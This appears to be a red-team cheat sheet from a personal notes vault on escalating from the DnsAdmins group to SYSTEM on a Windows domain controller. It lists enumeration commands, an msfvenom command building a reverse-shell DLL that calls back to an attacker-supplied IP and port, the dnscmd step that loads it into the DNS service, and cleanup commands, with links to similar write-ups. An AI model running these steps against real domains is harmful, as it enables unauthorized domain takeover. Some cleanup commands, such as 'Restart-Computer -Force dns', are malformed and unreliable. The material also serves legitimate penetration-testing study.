# Living off the Land

## 01 - Enumerate

> [!IMPORTANT] Conditions
> The user must be part of `DnsAdmins` domain group.


```
C:\> net user %USERNAME% /domain

C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[omitted]..
DOMAIN\DnsAdmins                                              Alias            S-1-5-64-10
```

```
C:\> reg.exe query HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters /v ServerLevelPluginDll

PS C:\> Get-ItemProperty Registry::HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

## 02 - Exploit

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll
```


```
C:\> dnscmd.exe /config /serverlevelplugindll .\payload.dll

C:\> sc.exe continue dns
```

## 03 - Cleanup

### 3.1 - Command Prompt

```
C:\> reg.exe delete HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters /v ServerLevelPluginDll
```

```
C:\> net.exe continue dns

C:\> sc.exe continue dns
```

### 3.2 - Powershell

```
PS C:\> Get-ItemProperty Registry::HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

PS C:\> Restart-Computer -Force dns
```

```
PS C:\> Get-Service -ComputerName <IP> -Name dns | Restart-Service -Force

PS C:\> Get-Service -ComputerName <IP> -Name dns | Stop-Service -Force

PS C:\> Get-Service -ComputerName <IP> -Name dns | Start-Service
```

---
## References

### Backlinks

- [[DLL Injection|Malware Development: DLL Injection]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Active Directory/0xA - Internal Reconnaissance/Users/Manual/Living off the Land]]

### Hacktricks

- [Hacktricks: Privileged Groups](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

### Red Team Notes

- [Red Team Notes: From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

### Hacking Articles

- [Hacking Articles: Windows Privilege Escalation - DnsAdmins to DomainAdmin](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)